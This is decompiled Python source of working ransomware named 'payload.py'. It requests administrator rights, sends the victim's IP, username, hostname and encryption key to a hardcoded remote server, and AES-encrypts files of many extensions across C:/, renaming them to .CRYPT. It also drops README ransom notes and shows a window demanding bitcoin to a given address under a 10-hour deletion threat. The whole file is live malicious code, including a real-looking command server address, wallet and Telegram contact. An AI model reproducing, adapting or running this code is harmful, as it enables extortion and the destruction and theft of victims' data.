# Python bytecode 3.8 (3413)
# Decompiled from: Python 2.7.17 (default, Sep 30 2020, 13:38:04) 
# Embedded file name: payload.py
import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64, PIL.Image, PIL.ImageTk
from pathlib import Path
from tkinter import *
from tkinter.ttk import *
from io import BytesIO
import ctypes
from Crypto import Random
from Crypto.Cipher import AES

class mainwindow(Tk):

    def __init__(self):
        Tk.__init__(self)
        self.title(string='Crypt')
        self.resizable(0, 0)
        self.configure(background='black')
        self.style = Style()
        self.style.theme_use('clam')
        photo_code = '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\n'
        photo = PIL.Image.open(BytesIO(base64.b64decode(photo_code)))
        resized = photo.resize((150, 150), PIL.Image.ANTIALIAS)
        photo = PIL.ImageTk.PhotoImage(resized)
        label = Label(self, image=photo, background='black')
        label.image = photo
        label.grid(row=5, column=0, rowspan=2)
        label = Label(self, image=photo, background='black')
        label.image = photo
        label.grid(row=5, column=3, rowspan=2)
        message = "Do not close this message !!!\n\nHi, don't worry. All of your files have been encrypted. \n\nTo return your files, you need to send 0.003 bitcoin \nto the address 1NNLcGozxxNmFypZB4rgnmvuCju2pxfAQQ \nif within 10 hours there is no payment, all your files will be deleted ...\n\nYou can pay through various crypto-exchanges (Binance, Coinbase and others), \ncrypto exchanges or from your personal bitcoin wallet.\n\nAfter payment you will receive a decoder and an unlock key and all your \nfiles will be unlocked. \n\nDo not try to unlock it yourself, you will only waste time, and after \n10 hours all files will be deleted. A strong encryption method is used \nfor encryption.\n\nCommunication after payment\ntelegram: @crypto_support_id_43274\n\n"
        Label(self, text=message, font='Helvetica 16 bold', foreground='white', background='red').grid(row=0, column=0, columnspan=4)
        Label(self, text='', font='Helvetica 18 bold', foreground='red', background='black').grid(row=5, column=2)
        Label(self, text='', font='Helvetica 18 bold', foreground='red', background='black').grid(row=6, column=2)

        def start_thread():
            thread = threading.Thread(target=start_timer)
            thread.daemon = True
            thread.start()

        def start_timer():
            Label(self, text='TIME LEFT:', font='Helvetica 18 bold', foreground='red', background='black').grid(row=5, column=0, columnspan=4)
            try:
                s = 36000
                while s:
                    min, sec = divmod(s, 60)
                    time_left = '{:02d}:{:02d}'.format(min, sec)
                    Label(self, text=time_left, font='Helvetica 18 bold', foreground='red', background='black').grid(row=6, column=0, columnspan=4)
                    time.sleep(1)
                    s -= 1

            except KeyboardInterrupt:
                print('Closed...')

        if os == 'Windows':
            pass
        else:
            start_thread()


def getlocalip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    return s.getsockname()[0]


def gen_string(size=64, chars=string.ascii_uppercase + string.digits):
    return ''.join((random.choice(chars) for _ in range(size)))


def pad(s):
    return s + '\x00' * (AES.block_size - len(s) % AES.block_size)


def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)


def encrypt_file(file_name, key):
    with open(file_name, 'rb') as (fo):
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name, 'wb') as (fo):
        fo.write(enc)
    os.rename(file_name, file_name + '.CRYPT')


host = '185.125.218.118'
port = 8989
key = hashlib.md5(gen_string().encode('utf-8')).hexdigest()
key = key.encode('utf-8')
os_platform = platform.system()
hostname = platform.node()
ext = [
 '.txt',
 '.ppt',
 '.pptx',
 '.doc',
 '.docx',
 '.gif',
 '.jpg',
 '.png',
 '.ico',
 '.mp3',
 '.ogg',
 '.csv',
 '.xls',
 '.exe',
 '.pdf',
 '.ods',
 '.odt',
 '.kdbx',
 '.kdb',
 '.mp4',
 '.flv',
 '.iso',
 '.zip',
 '.tar',
 '.tar.gz',
 '.rar',
 '.dat',
 '.keychain',
 '.sdf',
 '.vcf',
 '.tiff',
 '.tif',
 '.jpeg',
 '.jif',
 '.jfif',
 '.jp2',
 '.jpx',
 '.j2k',
 '.j2c',
 '.fpx',
 '.pcd',
 '.bmp',
 '.svg',
 '.3dm',
 '.3ds',
 '.max',
 '.obj',
 '.dds',
 '.psd',
 '.tga',
 '.thm',
 '.yuv',
 '.ai',
 '.eps',
 '.ps',
 '.indd',
 '.pct',
 '.avi',
 '.mkv',
 '.3g2',
 '.3gp',
 '.asf',
 '.m4v',
 '.mov',
 '.mpg',
 '.rm',
 '.srt',
 '.swf',
 '.vob',
 '.wmv',
 '.log',
 '.msg',
 '.pages',
 '.rtf',
 '.tex',
 '.wpd',
 '.wps',
 '.ged',
 '.key',
 '.pps',
 '.xml',
 '.json',
 '.xlsx',
 '.xlsm',
 '.xlsb',
 '.mht',
 '.mhtml',
 '.htm',
 '.html',
 '.xltx',
 '.prn',
 '.dif',
 '.slk',
 '.xlam',
 '.xla',
 '.docm',
 '.dotx',
 '.dotm',
 '.xps',
 '.ics',
 '.aif',
 '.iff',
 '.m3u',
 '.m4a',
 '.mid',
 '.mpa',
 '.wav',
 '.wma',
 '.msi',
 '.php',
 '.apk',
 '.app',
 '.bat',
 '.cgi',
 '.com',
 '.asp',
 '.aspx',
 '.cer',
 '.cfm',
 '.css',
 '.js',
 '.jsp',
 '.rss',
 '.xhtml',
 '.c',
 '.class',
 '.cpp',
 '.cs',
 '.h',
 '.java',
 '.lua',
 '.pl',
 '.sh',
 '.sln',
 '.swift',
 '.vb',
 '.vcxproj',
 '.dem',
 '.gam',
 '.nes',
 '.rom',
 '.sav',
 '.tgz',
 '.7z',
 '.cbr',
 '.deb',
 '.gz',
 '.pkg',
 '.rpm',
 '.zipx',
 '.accdb',
 '.db',
 '.dbf',
 '.mdb',
 '.sql',
 '.fnt',
 '.fon',
 '.otf',
 '.ttf',
 '.cfg',
 '.ini',
 '.prf',
 '.bak',
 '.old',
 '.tmp',
 '.torrent']

def get_target():
    return 'C:/'


def start_encrypt(p, key):
    message = "Do not close this message !!!\n\nHi, don't worry. All of your files have been encrypted. \n\nTo return your files, you need to send 0.003 bitcoin \nto the address 1NNLcGozxxNmFypZB4rgnmvuCju2pxfAQQ \nif within 10 hours there is no payment, all your files will be deleted ...\n\nYou can pay through various crypto-exchanges (Binance, Coinbase and others), \ncrypto exchanges or from your personal bitcoin wallet.\n\nAfter payment you will receive a decoder and an unlock key and all your \nfiles will be unlocked. \n\nDo not try to unlock it yourself, you will only waste time, and after \n10 hours all files will be deleted. A strong encryption method is used \nfor encryption.\n\nCommunication after payment\ntelegram: @crypto_support_id_43274\n\n"
    c = 0
    dirs = [
     '.']
    try:
        for x in dirs:
            target = p + x + '/'
            for path, subdirs, files in os.walk(target):
                for name in files:
                    for i in ext:
                        if name.endswith(i.lower()):
                            try:
                                encrypt_file(os.path.join(path, name), key)
                                c += 1
                            except Exception as e:
                                try:
                                    pass
                                finally:
                                    e = None
                                    del e

                    else:
                        try:
                            with open(path + '/README.txt', 'w') as (f):
                                f.write(message)
                                f.close()
                        except Exception as e:
                            try:
                                pass
                            finally:
                                e = None
                                del e

    except Exception as e:
        try:
            pass
        finally:
            e = None
            del e


def connector():
    global os_platform
    server = socket.socket(socket.AF_INET)
    server.settimeout(10)
    try:
        server.connect((host, port))
        msg = '%s$%s$%s$%s$%s' % (getlocalip(), os_platform, key, getpass.getuser(), hostname)
        server.send(msg.encode('utf-8'))
        start_encrypt(get_target(), key)
        main = mainwindow()
        main.mainloop()
    except Exception as e:
        try:
            start_encrypt(get_target(), key)
            main = mainwindow()
            main.mainloop()
        finally:
            e = None
            del e


def is_admin():
	try:
		return ctypes.windll.shell32.IsUserAnAdmin()
	except Exception as e:
		return False

if is_admin():
    try:
        connector()
    except KeyboardInterrupt:
        sys.exit(0)

else:
    ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, __file__, None, 1)
